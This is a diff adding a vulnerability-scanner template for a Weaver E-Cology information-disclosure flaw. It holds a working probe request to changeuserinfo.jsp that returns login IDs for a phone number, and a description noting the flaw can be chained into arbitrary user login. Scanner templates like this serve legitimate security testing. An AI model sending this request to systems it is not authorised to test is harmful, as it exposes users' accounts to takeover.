@@ -1,0 +1,12 @@
+name: 泛微E-Cology-changeUserInfo-信息泄露
+description: >
+  可组合利用任意用户登录：https://www.cnblogs.com/pursue-security/p/17677361.html
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /mobile/plugin/changeuserinfo.jsp?type=getLoginid&mobile=13
+    expression:
+      status: 200
+      body_all:
+        - "status"
